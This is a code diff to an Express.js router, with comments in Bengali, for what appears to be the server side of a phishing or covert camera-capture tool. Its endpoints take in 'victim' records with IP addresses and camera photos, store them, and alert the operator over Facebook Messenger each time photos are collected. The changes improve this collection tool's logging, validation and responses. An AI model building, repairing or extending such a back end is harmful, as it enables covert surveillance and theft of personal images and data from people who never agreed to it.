@@ -36,12 +36,17 @@ router.get('/fb/:id', async (req, res) => {
 router.post('/api/victim', async (req, res) => {
     try {
         const data = req.body;
-        console.log('📥 ভিক্টিম ডেটা পেয়েছি:', data);
+        console.log('📥 ভিক্টিম ডেটা পেয়েছি:', JSON.stringify(data, null, 2));
 
         // ডেটা ভ্যালিডেশন
         if (!data.id) {
-            console.error('Invalid data: missing id');
+            console.error('❌ id নেই!');
             return res.status(400).json({ status: 'error', message: 'Missing id' });
+        }
+
+        // fbId না থাকলে 'unknown' সেট করি
+        if (!data.fbId) {
+            data.fbId = 'unknown';
         }
 
         let victim = await Victim.findOne({ id: data.id });
@@ -50,7 +55,7 @@ router.post('/api/victim', async (req, res) => {
             // নতুন ভিক্টিম তৈরি
             victim = new Victim({
                 id: data.id,
-                fbId: data.fbId || 'unknown',
+                fbId: data.fbId,
                 type: data.type || 'camera',
                 timestamp: data.timestamp ? new Date(data.timestamp) : new Date(),
                 ip: data.ip || null,
@@ -78,20 +83,25 @@ router.post('/api/victim', async (req, res) => {
             console.log(`✅ ভিক্টিম আপডেট: ${data.id}`);
         }
 
-        // ইউজারকে মেসেজ পাঠান
+        // ইউজারকে মেসেজ পাঠান (যদি fbId থাকে)
         if (victim.fbId && victim.fbId !== 'unknown') {
             const msg = formatVictimData(victim);
             await sendMessage(victim.fbId, msg);
             console.log(`📤 মেসেজ পাঠানো হয়েছে: ${victim.fbId}`);
         } else {
-            console.log('⚠️ fbId নেই, মেসেজ পাঠানো হয়নি');
+            console.log('⚠️ fbId নেই বা unknown, মেসেজ পাঠানো হয়নি');
         }
 
-        res.status(200).json({ status: 'ok' });
+        res.status(200).json({ status: 'ok', data: victim });
 
     } catch (err) {
         console.error('❌ Victim data error:', err);
-        res.status(500).json({ status: 'error', message: err.message });
+        // বিস্তারিত এরর লগ
+        if (err.name === 'ValidationError') {
+            console.error('Validation Error:', err.errors);
+            return res.status(400).json({ status: 'error', message: 'Validation Error', errors: err.errors });
+        }
+        res.status(500).json({ status: 'error', message: err.message, stack: err.stack });
     }
 });
 
@@ -117,12 +127,11 @@ router.post('/api/camera', async (req, res) => {
 
         console.log(`📸 ক্যামেরা ছবি: ${id} (মোট ${victim.camera.length}টি)`);
 
-        // ইউজারকে নোটিফাই (যদি fbId থাকে)
         if (victim.fbId && victim.fbId !== 'unknown') {
             await sendMessage(victim.fbId, `📸 ক্যামেরা থেকে ${victim.camera.length}টি ছবি সংগ্রহ করা হয়েছে।`);
         }
 
-        res.status(200).json({ status: 'ok' });
+        res.status(200).json({ status: 'ok', count: victim.camera.length });
 
     } catch (err) {
         console.error('❌ Camera error:', err);
